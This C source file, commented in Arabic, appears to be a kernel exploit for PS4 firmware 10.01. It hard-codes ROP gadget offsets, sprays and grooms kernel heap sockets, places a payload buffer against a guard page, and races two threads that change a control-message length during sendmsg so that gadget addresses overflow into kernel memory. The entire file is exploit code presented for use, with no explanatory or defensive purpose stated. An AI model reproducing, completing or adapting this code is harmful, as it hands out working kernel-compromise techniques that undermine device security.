#include <ps4.h>

// --- الإزاحات لنسخة 10.01 ---
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_JMP_RSI_3B           0x049C5D 
#define OFF_LEA_RSP_RSI_20_RET   0x72B346 
#define OFF_POP_RBX_R14_RBP_JMP  0x345741 

// --- إعدادات الذاكرة لـ PS4 ---
#define PS4_PAGE_SIZE 0x4000
#define CONTROL_LEN   256
#define SPRAY_COUNT   256

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

uint8_t *mapped_payload;
struct cmsghdr *cmsg;
int global_sock;
int spray_socks[SPRAY_COUNT];
volatile int stop_race = 0;

// --- 1. تهيئة الـ Heap (Grooming) ---
void prepare_heap() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0); 
        if(spray_socks[i] > 0) {
            uint8_t dummy[0x50];
            memset(dummy, 0, 0x50);
            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0);
        }
    }
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) {
            syscall(6, spray_socks[i]); 
            spray_socks[i] = -1;
        }
    }
}

// --- 2. إعداد البفر بدقة (Unmapped Page Trick) ---
void setup_precision_buffer(uint64_t kbase) {
    // حجز صفحتين متتاليتين بحجم PS4
    uint8_t *pages = mmap(NULL, PS4_PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    // حماية الصفحة الثانية (تسبب EFAULT)
    mprotect(pages + PS4_PAGE_SIZE, PS4_PAGE_SIZE, PROT_NONE);

    // وضع البفر في نهاية الصفحة الأولى تماماً
    mapped_payload = pages + PS4_PAGE_SIZE - CONTROL_LEN;
    
    cmsg = (struct cmsghdr *)mapped_payload;
    memset(mapped_payload, 0, CONTROL_LEN);
    
    cmsg->cmsg_len = 0x50;
    cmsg->cmsg_level = 0;
    cmsg->cmsg_type = 7;

    uintptr_t step1 = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uintptr_t step4 = kbase + OFF_POP_RBX_R14_RBP_JMP;
    uintptr_t val_target = 0xDEADC0DE;

    // ملء منطقة الـ Overflow حتى نهاية الصفحة
    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
        *(uintptr_t *)(mapped_payload + i) = step1;
    }

    // وضع القيم التي تريد رؤيتها في السجلات عند الإزاحات المحددة
    *(uintptr_t *)(mapped_payload + 0x60) = step4;
    *(uintptr_t *)(mapped_payload + 0x68) = val_target; 
}

// --- 3. خيوط السباق المعدلة ---
void *sendmsg_thread(void *arg) {
    struct msghdr msg = {0};
    msg.msg_control = mapped_payload;
    msg.msg_controllen = CONTROL_LEN;

    while(!stop_race) {
        // إذا أعاد النظام EFAULT (قيمة 14)، فهذا يعني النجاح
        int ret = syscall(28, global_sock, &msg, 0);
        if (ret == -1 && errno == 14) { 
            stop_race = 1;
        }
    }
    return NULL;
}

void *race_thread(void *arg) {
    while(!stop_race) {
        cmsg->cmsg_len = 0x50;
        // تأخير ميكروي لضبط التوقيت مع copyin
        for(volatile int i=0; i<100; i++); 
        cmsg->cmsg_len = 0xFFFF;
    }
    return NULL;
}

int _main(struct thread *td) {
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    
    prepare_heap();
    setup_precision_buffer(kbase);

    global_sock = syscall(97, 2, 2, 0);

    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);

    return 0;
}
